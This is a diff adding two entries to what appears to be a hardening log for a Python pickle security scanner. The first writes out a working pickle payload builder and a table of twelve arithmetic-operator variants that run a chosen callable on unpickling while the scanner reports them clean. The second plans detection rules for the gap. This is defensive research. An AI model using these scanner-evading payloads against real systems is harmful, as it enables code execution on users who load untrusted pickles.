@@ -4485,3 +4485,160 @@ Blocking plan:
 
 Performance note: two literals in the existing magic-method match arm, no
 item-protocol flow modeling.
+
+## Turn 91 - Binary arithmetic method family gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as a binary arithmetic method, for example
+  `__add__`.
+- Instantiate the class with a marker path.
+- Call the matching clean `operator` helper, for example
+  `operator.add(instance, 0o666)`, during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_add_dunder_add_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        text("__add__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "add"),
+        b"h\x01",
+        b"M" + (0o666).to_bytes(2, "little"),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 for the `__add__` representative:
+
+- Control scanner result: `len=141`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=162`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=162`, `bytes_total=162`,
+  `opcode_count=34`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `operator.add`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.add` call returns
+  a `DerivedPath` instance at `/tmp/ma_operator_add_dunder_add_marker` and does
+  not create the marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_operator_add_dunder_add_marker` and returns `None`
+
+Sibling slot proof:
+
+| Operator | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `operator.add` | `__add__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.sub` | `__sub__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.mul` | `__mul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.matmul` | `__matmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.truediv` | `__truediv__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.mod` | `__mod__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.pow` | `__pow__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.lshift` | `__lshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.rshift` | `__rshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.and_` | `__and__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.xor` | `__xor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.or_` | `__or__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+
+`__floordiv__` was not counted as a clean bypass in this probe because the
+existing nested-raw-pickle heuristic already made that exact payload
+`malicious`.
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
+  binary operator slot such as `__add__ = pathlib.Path.touch`.
+- The payload instantiates that subclass for the marker path.
+- `operator.add(instance, 0o666)` dispatches to `instance.__add__(0o666)`.
+- Because `__add__` points at `Path.touch`, CPython calls
+  `Path.touch(instance, mode=0o666)`. Binary operator methods may return
+  arbitrary Python objects, so the `None` result is returned normally after the
+  file is created.
+
+Why the scanner missed it:
+
+- Arithmetic and bitwise dunder slots such as `__add__`, `__sub__`,
+  `__mul__`, `__matmul__`, `__truediv__`, `__mod__`, `__pow__`,
+  `__lshift__`, `__rshift__`, `__and__`, `__xor__`, and `__or__` are absent
+  from the suspicious magic-method string list.
+- The corresponding `operator` helpers are absent from `DANGEROUS_GLOBALS`;
+  current `operator` coverage includes `call`, `attrgetter`, `itemgetter`, and
+  `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as a synthesized binary operator method, so
+  the final visible call target is a common arithmetic helper rather than the
+  attacker-selected callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, attribute hooks, item hooks,
+  containment hooks, or rich-comparison hooks.
+
+Performance note: the focused next block should add the clean-bypassing binary
+operator slot names to the suspicious magic-method string list. That keeps the
+hot path to a fixed set of additional literal matches and avoids arithmetic
+flow modeling.
+
+## Turn 92 - Block binary arithmetic seeds
+
+Blocking plan:
+
+- Add the clean-bypassing binary arithmetic and bitwise dunder slots to the
+  existing suspicious magic-method string list: `__add__`, `__sub__`,
+  `__mul__`, `__matmul__`, `__truediv__`, `__mod__`, `__pow__`,
+  `__lshift__`, `__rshift__`, `__and__`, `__xor__`, and `__or__`.
+- Leave the corresponding `operator` helpers, `builtins.type`,
+  `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for this focused
+  block. The static signal is the attacker-controlled binary operator slot
+  name.
+- Add a CPython oracle regression that builds
+  `type(..., {"__add__": Path.touch})`-style payloads for all 12 clean
+  bypassing slots, verifies scan-time detection on both construction-only
+  controls and active `operator.*` RCE variants, proves the control instances
+  do not create markers, then proves each operator dispatch creates its marker
+  during `pickle.loads()`.
+- Do not add `__floordiv__` in this turn because the exact Turn 91 proof was
+  already caught by the nested-raw-pickle heuristic rather than being a
+  scanner-clean bypass.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: twelve literals in the existing magic-method match arm, no
+binary-operator flow modeling.
